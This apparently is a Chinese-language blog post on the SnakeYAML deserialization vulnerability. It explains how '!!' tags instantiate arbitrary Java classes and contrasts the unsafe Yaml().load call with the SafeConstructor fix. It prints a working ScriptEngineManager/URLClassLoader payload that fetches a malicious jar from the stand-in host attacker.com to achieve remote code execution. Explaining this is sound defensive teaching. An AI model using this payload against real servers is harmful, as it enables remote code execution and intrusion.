+++
description = "漏洞复现"
title = "SnakeYAML 概述"
date = 2026-09-11T16:12:08+08:00
draft = false
pin = false
+++

# 1.什么是  SnakeYAML  


fastjson 是处理  json 的   反序列化  的 一种操作   而   Xstream 则是处理  XML 反序列化的一种操作  对于   SnakeYAML  来说 则是处理  YAML 反序列化的一种操作 


核心原因一样 过度赋予了  解释器过度的权限 导致被攻击  

SnakeYAML 支持 YAML 的一种特殊语法，叫做 **“Tags” (标签)**。

- 当解析器读到 `!!` 符号时，它会认为：“哦，接下来的类名是一个 Java 类，我需要帮用户实例化它。”
    
- 致命后果：如果攻击者输入了一个包含恶意类的 YAML 标签，SnakeYAML 就会 自动在服务器上实例化这个类，并调用它的构造函数或 setter 方法。



# 2. 经典攻击模型：ScriptEngineManager

SnakeYAML 的漏洞利用通常非常“简单粗暴”，它不需要像 Commons-Collections 那样构造复杂的调用链，直接利用 JDK 自带的工具类就能完成 RCE。

最经典的 Payload 结构

```YAML
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/malicious.jar"]
  ]]
]
```


攻击原理

解析逻辑（它是怎么触发的）：

1. SnakeYAML 遇到    !!javax.script.ScriptEngineManager   ，直接实例化这个类。
    
2. 解析器继续调用其构造函数，将参数传进去。
    
3. 参数是一个    URLClassLoader，它会去远程下载并加载一个恶意的 .jar包。
    
4. 程序在加载该 Jar 包的过程中，直接触发了恶意代码执行（RCE）。



# 3.危险函数审计出现的点

出现的危险函数

```c
// 危险用法：直接使用默认构造器，允许实例化任何类
Yaml yaml = new Yaml();
yaml.load(userInput); // 漏洞点！
```

安全的防御的点

```c
// 安全用法：使用 SafeConstructor
Yaml yaml = new Yaml(new SafeConstructor());
yaml.load(userInput);
```













